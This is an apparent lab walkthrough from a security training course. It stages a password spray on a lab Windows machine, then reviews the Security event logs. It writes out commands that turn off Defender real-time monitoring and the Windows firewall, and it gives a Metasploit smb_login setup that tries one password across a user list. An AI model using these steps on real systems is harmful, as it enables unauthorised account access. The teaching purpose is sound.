![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


# Password Spray

In this lab we will be conducting a password spray against a Windows system.

This is part of the T1110 family of attacks with MITRE.

Find out more here:

https://attack.mitre.org/techniques/T1110/ 

Here are just some of the groups that have used it.

<img width="1073" height="764" alt="image" src="https://github.com/user-attachments/assets/a24a4a9c-305d-476d-a808-417d0c3b5a3c" />


First things first, disable **Defender**. Open an instance of **Windows PowerShell** by clicking on the icon in the taskbar. Then run the following:

<img width="42" height="36" alt="image" src="https://github.com/user-attachments/assets/65c951dd-aafc-402f-9fb3-4fed153fe74d" />


<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>

This will disable **Defender** for this session.

If you get angry red errors, that is Ok, it means **Defender** is not running.

Let's get started by opening a **Command Prompt** terminal by clicking on the icon in the taskbar.

<img width="52" height="48" alt="image" src="https://github.com/user-attachments/assets/5b7379a9-ed44-4c6f-a7b0-5cdd203610ef" />


Let's first get our IP address for your Windows system.  We will be using this later.

<pre>ipconfig</pre>

Next, let's make sure the firewall is down.  This will allow us to configure the system to match what many internal systems have.

No firewall.....  So much for defense in depth.

<pre>netsh advfirewall set allprofiles state off</pre>

Once the terminal opens, navigate into the appropriate directory by running the following command:

<pre>cd \IntroLabs</pre>

We need to run the batch file named **200-user-gen** 

First, let's get an updated version:

<pre>curl -o 200-user-gen.bat https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/200-user-gen.bat</pre>

Now, we need to run it!

Do so by typing the name of the batch file and hitting enter:

<pre>200-user-gen.bat</pre>

It should look like this:

<img width="980" height="410" alt="image" src="https://github.com/user-attachments/assets/a77f162f-2521-4de8-8f97-b091d9caca30" />


Let this run all the way through. 

**Even though it looks endless, it's not!**

Now we need to get our attack system ready,

First, let’s start up a Kali instance:

<img width="81" height="75" alt="image" src="https://github.com/user-attachments/assets/15d9793c-15c8-498d-9b10-4a8303b92d62" />

Next, let's become root:

<pre>sudo su -</pre>

Now, let's get a user list:

<pre>wget https://raw.githubusercontent.com/strandjs/IntroLabs/refs/heads/master/users.txt
</pre>

It should look like this:

<img width="662" height="513" alt="image" src="https://github.com/user-attachments/assets/f6f654c5-ad2d-4c8f-b8da-22ccacebc2dc" />


Please note this list would be acquired by running recon on sites like LinkedIn and possibly a company directory.

Now, let's start up and configure Metasploit for the remote attack!

<pre>msfconsole -q</pre>

<pre>use auxiliary/scanner/smb/smb_login</pre>

<pre>set RHOST 10.10.124.217</pre>

#Remember!! Your IP address will be different!!!!!

<pre>set USER_FILE users.txt</pre>

<pre>set SMBPASS Winter2025</pre>

It should look like this:

<img width="663" height="323" alt="image" src="https://github.com/user-attachments/assets/85491c23-0eab-4f68-94ca-03f91529aa1b" />


But wait!!!! Before we run it we should clear the event logs so it is easier to see the attack!

Let's open event viewer on Windows.

<img width="347" height="624" alt="image" src="https://github.com/user-attachments/assets/bca40bdc-c325-419b-8f20-28de81f96f9e" />

Next, let's right-click on the Security events and clear them.

<img width="326" height="383" alt="image" src="https://github.com/user-attachments/assets/94e4a7d7-568b-4e76-bb72-fd3d223193d1" />

When it asks you to clear, just Clear.  No need to save.

Now, let's go back to the Kali system and run our attack.

<pre>run</pre>

It should look like this:

<img width="665" height="357" alt="image" src="https://github.com/user-attachments/assets/addee394-b49d-4163-b12b-f9108bddc5da" />

Please look closer at the green successful login accounts.

<img width="646" height="51" alt="image" src="https://github.com/user-attachments/assets/bc575759-db09-42bb-ab1d-7ddcdaf65c93" />

Are there any Administrator logins?

Yes! There is!!

<img width="655" height="36" alt="image" src="https://github.com/user-attachments/assets/0574f486-ad24-442e-bd7b-b2836cc10c39" />

Now, let's look at the logs back in the event viewer:

Int he action panel on the right you will need to click the refresh button.

<img width="200" height="383" alt="image" src="https://github.com/user-attachments/assets/9bb4440d-d344-4258-b2a0-e401f1dea6e5" />

Now, we should be able to see the logs.

<img width="1168" height="687" alt="image" src="https://github.com/user-attachments/assets/d78f04d6-b2f6-4c71-90b8-092a3467badd" />


<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---

